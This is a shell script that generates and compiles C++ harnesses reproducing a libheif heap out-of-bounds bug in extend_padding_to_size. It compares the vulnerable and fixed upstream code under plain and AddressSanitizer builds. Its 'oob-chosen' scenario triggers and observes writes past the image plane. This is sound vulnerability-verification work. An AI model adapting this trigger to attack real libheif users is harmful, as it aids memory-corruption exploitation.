#!/bin/sh
# libheif2shell direct-call harness (GHSA-hpg4-g2gc-pq42, fix 9ec655f).
# Verbatim slices of pinned pixelimage.cc and heif_image.cc (v1.23.6 vulnerable
# / fix-commit fixed) are included under #line control. Stubs are confined to
# the surrounding types and the plane allocator; the vulnerable function and
# the public API wrapper are upstream bytes. No HEVC/AVC/x265 codec, image
# file, sequence encoder, process, socket, wire or network is involved.
set -eu
HERE=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
SRC=$(CDPATH= cd -- "$HERE/../src" && pwd)
OUT="$HERE/evidence"
mkdir -p "$OUT"

gen_driver() { # variant
    v=$1
    if [ "$v" = vuln ]; then
        ms=597; me=690; ws=401; we=410
        pixel="pixelimage.cc.vuln"; wrapper="heif_image.cc.vuln"
    else
        ms=608; me=726; ws=401; we=416
        pixel="pixelimage.cc.fixed"; wrapper="heif_image.cc.fixed"
    fi
    f="$HERE/driver-$v.cpp"
    {
        cat <<'HEADER'
/* Generated by harness/run.sh. Pinned upstream bytes are under #line;
   everything else is a declared stub. Do not edit this file by hand. */
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <memory>
#include <vector>
#include <string>

/* ---- declared stubs mirroring the pinned libheif headers ---- */
enum heif_error_code {
    heif_error_Ok = 0, heif_error_Unsupported_feature = 1,
    heif_error_Usage_error = 2, heif_error_Memory_allocation_error = 3
};
enum heif_suberror_code { heif_suberror_Unspecified = 0,
                          heif_suberror_Invalid_parameter_value = 1 };
struct heif_error { heif_error_code code; heif_suberror_code subcode;
                    const char* message; };
static heif_error heif_error_success = {heif_error_Ok, heif_suberror_Unspecified, nullptr};
enum heif_chroma { heif_chroma_monochrome = 0 };
enum heif_channel { heif_channel_Y = 0, heif_channel_Cb = 1, heif_channel_Cr = 2 };
enum heif_datatype { heif_datatype_integer = 0 };
struct heif_security_limits {};
struct heif_memory_handle { void free(size_t) {} };

struct Error {
    heif_error_code code; heif_suberror_code sub; const char* msg;
    Error(heif_error_code c, heif_suberror_code s, const char* m)
        : code(c), sub(s), msg(m) {}
    static Error Ok;
    static Error InternalError;
    explicit operator bool() const { return code != heif_error_Ok; }
    heif_error error_struct(const void*) const { return {code, sub, msg}; }
};
Error Error::Ok = {heif_error_Ok, heif_suberror_Unspecified, ""};
Error Error::InternalError = {heif_error_Usage_error, heif_suberror_Unspecified,
                              "internal error"};

/* Pinned pixelimage.cc:601-604 states that get_subsampled_size() has a
   non-Cb/Cr component assume the full logical image size. This stub is that
   documented identity case (Y plane, monochrome chroma). */
static void get_subsampled_size(uint32_t w, uint32_t h, heif_channel,
                                heif_chroma, uint32_t* sw, uint32_t* sh)
{ *sw = w; *sh = h; }
static int num_interleaved_components_per_plane(heif_chroma) { return 1; }

#ifndef HEIF_TAIL
#define HEIF_TAIL 0
#endif

struct HeifPixelImage {
    struct ComponentStorage {
        heif_channel m_channel = heif_channel_Y;
        std::vector<uint32_t> m_component_ids;
        heif_datatype m_datatype = heif_datatype_integer;
        int m_bit_depth = 8;
        uint8_t m_bytes_per_pixel = 1;
        uint32_t m_width = 0, m_height = 0;
        uint32_t m_mem_width = 0, m_mem_height = 0;
        void* mem = nullptr;
        uint8_t* allocated_mem = nullptr;
        size_t allocation_size = 0;
        size_t stride = 0;

        int get_bytes_per_pixel() const { return m_bytes_per_pixel; }

        /* Stub allocator: exact stride*height region for ASan builds; for
           plain builds a HEIF_TAIL-byte canary follows the declared plane so
           chosen bytes can be observed after the copy. */
        Error alloc(uint32_t w, uint32_t h, heif_datatype, int, int,
                    const heif_security_limits*, heif_memory_handle&) {
            m_bytes_per_pixel = 1;
            stride = w;
            size_t n = (size_t)stride * h;
            uint8_t* p = static_cast<uint8_t*>(std::malloc(n + HEIF_TAIL));
            if (!p)
                return {heif_error_Memory_allocation_error,
                        heif_suberror_Unspecified, "malloc failed"};
            std::memset(p, 0xa5, n + HEIF_TAIL);
            allocated_mem = p;
            mem = p;
            allocation_size = n;
            m_width = w; m_height = h;
            m_mem_width = w; m_mem_height = h;
            return Error::Ok;
        }
    };

    uint32_t m_width = 0, m_height = 0;
    heif_chroma m_chroma = heif_chroma_monochrome;
    std::vector<ComponentStorage> m_storage;
    heif_memory_handle m_memory_handle;

    Error extend_padding_to_size(uint32_t width, uint32_t height, bool adjust_size,
                                 const heif_security_limits* limits);
};

struct heif_image { std::shared_ptr<HeifPixelImage> image; };
HEADER

        printf '\n#line %d "pixelimage.cc.%s"\n' "$ms" "$v"
        awk -v a="$ms" -v b="$me" 'NR >= a && NR <= b' "$SRC/$pixel"

        printf '\n#line %d "heif_image.cc.%s"\n' "$ws" "$v"
        awk -v a="$ws" -v b="$we" 'NR >= a && NR <= b' "$SRC/$wrapper"

        cat <<'FOOTER'

#line 1000 "driver-main.cpp"
static void heif_dbg_mark() {}

int main(int argc, char** argv)
{
    setbuf(stdout, nullptr);
    const char* sc = argc > 1 ? argv[1] : "baseline";
    uint32_t W = 64, H = 65, RW = 64, RH = 65;
    if (!std::strcmp(sc, "oob-chosen")) { RW = 512; RH = 64; }
    else if (!std::strcmp(sc, "grow-ok")) { W = 64; H = 64; RW = 512; RH = 128; }

    auto img = std::make_shared<HeifPixelImage>();
    img->m_width = W;
    img->m_height = H;
    img->m_chroma = heif_chroma_monochrome;

    HeifPixelImage::ComponentStorage plane;
    plane.m_channel = heif_channel_Y;
    plane.m_datatype = heif_datatype_integer;
    plane.m_bit_depth = 8;
    plane.m_bytes_per_pixel = 1;
    plane.m_width = W; plane.m_height = H;
    plane.m_mem_width = W; plane.m_mem_height = H;
    plane.stride = W;
    size_t old_n = (size_t)W * H;
    plane.allocated_mem = static_cast<uint8_t*>(std::malloc(old_n));
    std::memset(plane.allocated_mem, 0x5a, old_n);
    plane.mem = plane.allocated_mem;
    plane.allocation_size = old_n;
    img->m_storage.push_back(plane);

    heif_image hi;
    hi.image = img;
    heif_error e = heif_image_extend_padding_to_size(&hi, (int)RW, (int)RH);
    heif_dbg_mark();

    printf("GUARD scenario=%s req=%ux%u plane=%ux%u rc=%d msg=%s\n",
           sc, RW, RH, W, H, e.code, e.message ? e.message : "-");
    if (e.code != 0) {
        printf("CASE scenario=%s guard=reject rc=%d copies=0\n", sc, e.code);
    } else if (!std::strcmp(sc, "oob-chosen")) {
        uint8_t* m = static_cast<uint8_t*>(img->m_storage[0].mem);
        printf("CASE scenario=%s guard=absent stride=%zu b32768=%02x b32769=%02x b32770=%02x b32771=%02x\n",
               sc, img->m_storage[0].stride,
               m[32768], m[32769], m[32770], m[32771]);
    } else {
        printf("CASE scenario=%s guard=absent copy=completed\n", sc);
    }
    std::free(img->m_storage[0].allocated_mem);
    return 0;
}
FOOTER
    } > "$f"
}

gen_driver vuln
gen_driver fixed

build() { # compiler variant mode
    cc=$1; v=$2; mode=$3
    bin="bin-$cc-$v-$mode"
    if [ "$cc" = gcc ]; then cxx=g++; else cxx=clang++; fi
    flags="-O0 -g -Wall"
    tail=0
    if [ "$mode" = asan ]; then
        flags="$flags -fsanitize=address -fno-omit-frame-pointer"
    else
        tail=1024
    fi
    # shellcheck disable=SC2086
    "$cxx" $flags -DHEIF_TAIL=$tail -o "$HERE/$bin" "$HERE/driver-$v.cpp"
}

for cc in gcc clang; do
    for v in vuln fixed; do
        for mode in plain asan; do
            build "$cc" "$v" "$mode"
        done
    done
done

printf 'generated 2 drivers and 8 binaries in %s\n' "$HERE"
